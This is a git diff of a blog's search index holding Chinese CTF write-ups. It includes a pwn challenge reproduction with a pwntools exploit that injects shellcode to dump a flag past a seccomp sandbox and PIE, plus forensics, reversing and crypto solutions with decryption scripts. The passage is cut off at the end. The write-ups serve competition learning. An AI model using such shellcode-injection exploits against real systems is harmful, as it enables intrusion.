@@ -413,6 +413,59 @@
       </tags>
   </entry>
   <entry>
+    <title>蓝帽杯初赛pwn1复现</title>
+    <url>/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/</url>
+    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道升级版的ret2shellcode</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224631699.png" class="" title="image-20220710224631699">
+
+
+
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224715244.png" class="" title="image-20220710224715244">
+
+<p><code>init_io()</code>就是一个io初始化函数，然后可以看到这道题开了沙盒，那就利用工具检查一下，结果如下图所示</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224957314.png" class="" title="image-20220710224957314">
+
+<p>可以看到一个白名单，根据内容可以看出只开了read和write，所以这道题就不用咱们getshell了。</p>
+<h3 id="init-main"><a href="#init-main" class="headerlink" title="init_main()"></a>init_main()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225220354.png" class="" title="image-20220710225220354">
+
+<p>可以看到<code>heap_mem</code>这个全局变量保存了堆的malloc地址，然后下面的代码其实就将bss段上的内容写到堆上，具体内容如下图所示。</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225451610.png" class="" title="image-20220710225451610">
+
+
+
+<h3 id="init-flag"><a href="#init-flag" class="headerlink" title="init_flag()"></a>init_flag()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225612172.png" class="" title="image-20220710225612172">
+
+<p>看到了不得了的东西，直接将flag写到了bss段上。</p>
+<h3 id="go"><a href="#go" class="headerlink" title="go()"></a>go()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225729898.png" class="" title="image-20220710225729898">
+
+<p>因为<code>heap_mem</code>上保存的是堆的malloc地址，所以这里我们写入的内容是写到了之前创建的堆上，然后也返回到我们之前的堆上面去。</p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>首先运行一下程序</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710230113827.png" class="" title="image-20220710230113827">
+
+<p>在随便输入一串数据后程序果然崩溃了，当时我以为造成程序崩溃的是堆上的垃圾数据，所以分析到这便没了后续。但是比较敏感的话其实可以感觉的得出来在<code>init_mem()</code>中堆上写的其实并不是随随便便的垃圾数据，进入调试一下便可验证。</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710230644865.png" class="" title="image-20220710230644865">
+
+<p>如上图所示，其实<code>ret heap_mem()</code>后程序还能继续正常执行，写入到堆中的其实是一句句可执行的汇编指令，最后导致程序崩溃的原因是在后面。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>经过上诉分析程序的利用点还是很好看出来的，我们只需要在read的时候向程序写入攻击的shellcode便可正常执行获取flag。这里可以选择利用write系统调用，直接将flag打印出来。</p>
+<p>&#x3D;&#x3D;因为开启了PIE，所以这里的flag的地址需要我们进行爆破一下，但爆破有个简单的方法：&#x3D;&#x3D;</p>
+<p>在执行完系统调用后，rcx会保存下一条指令的地址（原因涉及内核，感兴趣可去了解），如下图所示。</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710231937873.png" class="" title="image-20220710231937873">
+
+<p>利用这点我们就可以定位到shellcode地址，因为shllcode保存地址和flag保存地址就差28位，利用and获得其高位保存在rsi 作为基地址，后28位需要爆破，r15存储偏移，每次打印0x1000个字符，打印后跳转到$-0x19也就是mov rax，1处，然后继续从基地址+0x1000开始打印0x1000个字符，如此循环即可。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;39.106.156.74&quot;,23470)</span></span><br><span class="line"><span class="comment">#start=0</span></span><br><span class="line">start=<span class="number">0x500000000000</span></span><br><span class="line"><span class="comment">#addr=0x5633c143f000</span></span><br><span class="line">code=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,&#123;&#125;</span></span><br><span class="line"><span class="string">    mov r12,0xfffff0000000</span></span><br><span class="line"><span class="string">    mov r15,0x1000#r15储存偏移</span></span><br><span class="line"><span class="string">    mov rdx,0x1000#打印长度设置为0x1000</span></span><br><span class="line"><span class="string">    mov rax,1</span></span><br><span class="line"><span class="string">    syscall#write(rdi,rsi,rdx)</span></span><br><span class="line"><span class="string">    mov rsi,rcx#write执行后rcx 储存着shllcode的相关地址</span></span><br><span class="line"><span class="string">    and rsi,r12#丢弃后28位</span></span><br><span class="line"><span class="string">    add rsi,r15#rsi=rsi+偏移地址</span></span><br><span class="line"><span class="string">    add r15,0x1000#偏移递增0x1000</span></span><br><span class="line"><span class="string">    jmp $-0x19#循环 跳转到mov rax，1 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(start)</span><br><span class="line">payload=asm(code)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line">flag=<span class="string">b&#x27;flag&#123;&#x27;</span>+sh.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实这题不难，比赛过程中被自己误导后就放弃了，也个自己涨了教训，当遇到“绝境“的时候不妨静下心仔细调试一下。</p>
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2022蓝帽杯初赛WP</title>
     <url>/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9BWP/</url>
     <content><![CDATA[<h1 id="misc-domainhacker"><a href="#misc-domainhacker" class="headerlink" title="misc_domainhacker"></a>misc_domainhacker</h1><p>下载附件，发现是流量分析题，用wireshark打开</p>
@@ -532,139 +585,6 @@
       <tags>
         <tag>misc</tag>
         <tag>取证</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>蓝帽杯初赛pwn1复现</title>
-    <url>/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/</url>
-    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道升级版的ret2shellcode</p>
-<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224631699.png" class="" title="image-20220710224631699">
-
-
-
-<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224715244.png" class="" title="image-20220710224715244">
-
-<p><code>init_io()</code>就是一个io初始化函数，然后可以看到这道题开了沙盒，那就利用工具检查一下，结果如下图所示</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224957314.png" class="" title="image-20220710224957314">
-
-<p>可以看到一个白名单，根据内容可以看出只开了read和write，所以这道题就不用咱们getshell了。</p>
-<h3 id="init-main"><a href="#init-main" class="headerlink" title="init_main()"></a>init_main()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225220354.png" class="" title="image-20220710225220354">
-
-<p>可以看到<code>heap_mem</code>这个全局变量保存了堆的malloc地址，然后下面的代码其实就将bss段上的内容写到堆上，具体内容如下图所示。</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225451610.png" class="" title="image-20220710225451610">
-
-
-
-<h3 id="init-flag"><a href="#init-flag" class="headerlink" title="init_flag()"></a>init_flag()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225612172.png" class="" title="image-20220710225612172">
-
-<p>看到了不得了的东西，直接将flag写到了bss段上。</p>
-<h3 id="go"><a href="#go" class="headerlink" title="go()"></a>go()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225729898.png" class="" title="image-20220710225729898">
-
-<p>因为<code>heap_mem</code>上保存的是堆的malloc地址，所以这里我们写入的内容是写到了之前创建的堆上，然后也返回到我们之前的堆上面去。</p>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>首先运行一下程序</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710230113827.png" class="" title="image-20220710230113827">
-
-<p>在随便输入一串数据后程序果然崩溃了，当时我以为造成程序崩溃的是堆上的垃圾数据，所以分析到这便没了后续。但是比较敏感的话其实可以感觉的得出来在<code>init_mem()</code>中堆上写的其实并不是随随便便的垃圾数据，进入调试一下便可验证。</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710230644865.png" class="" title="image-20220710230644865">
-
-<p>如上图所示，其实<code>ret heap_mem()</code>后程序还能继续正常执行，写入到堆中的其实是一句句可执行的汇编指令，最后导致程序崩溃的原因是在后面。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>经过上诉分析程序的利用点还是很好看出来的，我们只需要在read的时候向程序写入攻击的shellcode便可正常执行获取flag。这里可以选择利用write系统调用，直接将flag打印出来。</p>
-<p>&#x3D;&#x3D;因为开启了PIE，所以这里的flag的地址需要我们进行爆破一下，但爆破有个简单的方法：&#x3D;&#x3D;</p>
-<p>在执行完系统调用后，rcx会保存下一条指令的地址（原因涉及内核，感兴趣可去了解），如下图所示。</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710231937873.png" class="" title="image-20220710231937873">
-
-<p>利用这点我们就可以定位到shellcode地址，因为shllcode保存地址和flag保存地址就差28位，利用and获得其高位保存在rsi 作为基地址，后28位需要爆破，r15存储偏移，每次打印0x1000个字符，打印后跳转到$-0x19也就是mov rax，1处，然后继续从基地址+0x1000开始打印0x1000个字符，如此循环即可。</p>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;39.106.156.74&quot;,23470)</span></span><br><span class="line"><span class="comment">#start=0</span></span><br><span class="line">start=<span class="number">0x500000000000</span></span><br><span class="line"><span class="comment">#addr=0x5633c143f000</span></span><br><span class="line">code=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,&#123;&#125;</span></span><br><span class="line"><span class="string">    mov r12,0xfffff0000000</span></span><br><span class="line"><span class="string">    mov r15,0x1000#r15储存偏移</span></span><br><span class="line"><span class="string">    mov rdx,0x1000#打印长度设置为0x1000</span></span><br><span class="line"><span class="string">    mov rax,1</span></span><br><span class="line"><span class="string">    syscall#write(rdi,rsi,rdx)</span></span><br><span class="line"><span class="string">    mov rsi,rcx#write执行后rcx 储存着shllcode的相关地址</span></span><br><span class="line"><span class="string">    and rsi,r12#丢弃后28位</span></span><br><span class="line"><span class="string">    add rsi,r15#rsi=rsi+偏移地址</span></span><br><span class="line"><span class="string">    add r15,0x1000#偏移递增0x1000</span></span><br><span class="line"><span class="string">    jmp $-0x19#循环 跳转到mov rax，1 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(start)</span><br><span class="line">payload=asm(code)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line">flag=<span class="string">b&#x27;flag&#123;&#x27;</span>+sh.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实这题不难，比赛过程中被自己误导后就放弃了，也个自己涨了教训，当遇到“绝境“的时候不妨静下心仔细调试一下。</p>
-]]></content>
-      <categories>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2023楚慧杯初赛</title>
-    <url>/2023/04/01/2023%E6%A5%9A%E6%85%A7%E6%9D%AFWP/</url>
-    <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h2><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image002.gif" alt="图片"></p>
-<p>下载附件拿到一张黑猫警长的图片，放入010</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image004.gif" alt="图片"></p>
-<p>发现文件末尾有一段很长的数据，单独提取出来</p>
-<p>查看图片属性，发现备注</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image006.gif" alt="图片"></p>
-<p>应该是要让我们用VeraCrypt挂载，猜测提取出来的多余数据就是镜像文件，需要寻找到密码</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image008.gif" alt="图片"></p>
-<p>在文件中间位置找到了VCpwd为a$%lSU，把分离出来的文件用vc进行挂载</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image010.gif" alt="图片"></p>
-<p>挂载成功，但是发现flag文件夹并没有东西</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image012.gif" alt="图片"></p>
-<p>猜测是写在文件簇里了，用winhex打开磁盘，搜索flag得到flag</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image014.gif" alt="图片"></p>
-<p><strong>flag{4ba7689c6dee7749403380b11c416de6}</strong></p>
-<h2 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h2><p>解压下一个e01文件，放入取证大师进行取证</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image016.gif" alt="图片"></p>
-<p>发现有分区存在bitlocker加密，现看看另一个分区的文件</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image018.gif" alt="图片"></p>
-<p>得到一张png</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image020.gif" alt="图片"></p>
-<p>zsteg -a发现了pass2：ChaiYan</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image022.gif" alt="图片"></p>
-<p>图片的宽高明显有问题，根据CRC脚本爆破得到</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image024.jpg" alt="图片"></p>
-<p>修改高度为正确高度</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230401164349425.png" alt="image-20230401164349425"></p>
-<p>得到图片</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image028.gif" alt="图片"></p>
-<p>pass1为OXi，拼接得到密码OXiChaiYan，用该密码bitlocker解密分区1</p>
-<p>得到flag.zip</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230401164403402.png" alt="image-20230401164403402"></p>
-<p>里面是加密的flag.txt和001.png文件，同样的密码解密压缩包得到flag</p>
-<p><strong>flag{b6aa5b40559fc9762918cd32f5f6bd0f}</strong></p>
-<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230401164412865.png" alt="image-20230401164412865"></p>
-<p>加密文本文件，放入winhex发现是伪加密</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230401164420785.png" alt="image-20230401164420785"></p>
-<p>将9改为0成功解压，缩小文本得到flag</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230401164426616.png" alt="image-20230401164426616"></p>
-<p><strong>flag{b3b2cc1ffcaa12f61c6e61c519d1db2f}</strong></p>
-<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="Level-One"><a href="#Level-One" class="headerlink" title="Level_One"></a>Level_One</h2><p>找到<img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image038.jpg" alt="图片"></p>
-<p>换表base</p>
-<p>在strings.xml资源里找到enc和table</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_decode</span>(<span class="params">ciphertext, table</span>):</span><br><span class="line"></span><br><span class="line">  padding_char = table[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">  table = table[:-<span class="number">1</span>] + <span class="string">&#x27;=&#x27;</span></span><br><span class="line"></span><br><span class="line">  table_dict = &#123;table[i]: i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table))&#125;</span><br><span class="line"></span><br><span class="line">  table_dict[padding_char] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  result = []</span><br><span class="line"></span><br><span class="line">  buffer = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> table_dict:</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">​    val = table_dict[char]</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">​    buffer &lt;&lt;= <span class="number">6</span></span><br><span class="line"></span><br><span class="line">​    buffer |= val</span><br><span class="line"></span><br><span class="line">​    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> count == <span class="number">4</span>:</span><br><span class="line"></span><br><span class="line">​      result.append((buffer &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">​      result.append((buffer &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">​      result.append(buffer &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">​      buffer = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">​      count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> count == <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">​    buffer &gt;&gt;= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">​    result.append(buffer &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">elif</span> count == <span class="number">3</span>:</span><br><span class="line"></span><br><span class="line">​    buffer &gt;&gt;= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">​    result.append((buffer &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">​    result.append(buffer &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(result).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&#x27;UsPYUFORMXnHSXIe6xpFSilR2iKs6RvtjeVFSfpHSX9zM0Sp6XVFjeK5&#x27;</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;n4/Xv90ElB32S6MmyK+iVIgkjU17CDGaLYxeuzsc8TqNOtrJWPfRp=HFhAwdb5oZQ&lt;&#x27;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">plaintext = base64_decode(ciphertext, table)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>
-
-<p><strong>flag{380605c6-7123-4f71-b573-601e8c4457b4}</strong></p>
-<h2 id="Level-Up"><a href="#Level-Up" class="headerlink" title="Level_Up"></a>Level_Up</h2><p>把so提出来放ida</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image040.gif" alt="图片"></p>
-<p>加密方式为：AES128+base</p>
-<p>利用findcrypt插件找base64密文</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image042.gif" alt="图片"></p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image044.gif" alt="图片"></p>
-<p>在这里看到了这一串，跟进去</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image046.jpg" alt="图片"></p>
-<p>key为followyourheart!</p>
-<p>密文为：</p>
-<p>“gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V&#x2F;m39bthXTeT3E6WYrLU0CDqG76Kvpkmc”</p>
-<p>解密脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line"></span><br><span class="line">  \<span class="comment"># 将Base64编码的数据解码为字节串</span></span><br><span class="line"></span><br><span class="line">  ciphertext = base64.b64decode(ciphertext)</span><br><span class="line"></span><br><span class="line">  \<span class="comment"># 创建一个AES密码对象</span></span><br><span class="line"></span><br><span class="line">  cipher = AES.new(key.encode(), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">  \<span class="comment"># 解密数据并去除填充部分</span></span><br><span class="line"></span><br><span class="line">  plaintext = cipher.decrypt(ciphertext).rstrip(<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  \<span class="comment"># 返回解密后的数据</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> plaintext.decode()</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;gOuWlCTi+hhzCn6rWxDm8IuuBwiOtM+V/m39bthXTeT3E6WYrLU0CDqG76Kvpkmc&quot;</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;followyourheart!&quot;</span></span><br><span class="line"></span><br><span class="line">plaintext = decrypt_data(ciphertext, key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>得到flag，<strong>flag{6b1df900-1284-11ed-9fa7-5405dbe5e745}</strong></p>
-<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RollingBase"><a href="#RollingBase" class="headerlink" title="RollingBase"></a>RollingBase</h2><p>换表base</p>
-<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image048.gif" alt="图片"></p>
-<p><strong>flag{416d3b4a10a9925363a44275d8655c5d}</strong></p>
-]]></content>
-      <categories>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-        <tag>re</tag>
       </tags>
   </entry>
   <entry>
@@ -799,6 +719,86 @@
         <tag>web</tag>
         <tag>re</tag>
         <tag>crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2023楚慧杯初赛</title>
+    <url>/2023/04/01/2023%E6%A5%9A%E6%85%A7%E6%9D%AFWP/</url>
+    <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h2><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image002.gif" alt="图片"></p>
+<p>下载附件拿到一张黑猫警长的图片，放入010</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image004.gif" alt="图片"></p>
+<p>发现文件末尾有一段很长的数据，单独提取出来</p>
+<p>查看图片属性，发现备注</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image006.gif" alt="图片"></p>
+<p>应该是要让我们用VeraCrypt挂载，猜测提取出来的多余数据就是镜像文件，需要寻找到密码</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image008.gif" alt="图片"></p>
+<p>在文件中间位置找到了VCpwd为a$%lSU，把分离出来的文件用vc进行挂载</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image010.gif" alt="图片"></p>
+<p>挂载成功，但是发现flag文件夹并没有东西</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image012.gif" alt="图片"></p>
+<p>猜测是写在文件簇里了，用winhex打开磁盘，搜索flag得到flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image014.gif" alt="图片"></p>
+<p><strong>flag{4ba7689c6dee7749403380b11c416de6}</strong></p>
+<h2 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h2><p>解压下一个e01文件，放入取证大师进行取证</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image016.gif" alt="图片"></p>
+<p>发现有分区存在bitlocker加密，现看看另一个分区的文件</p>
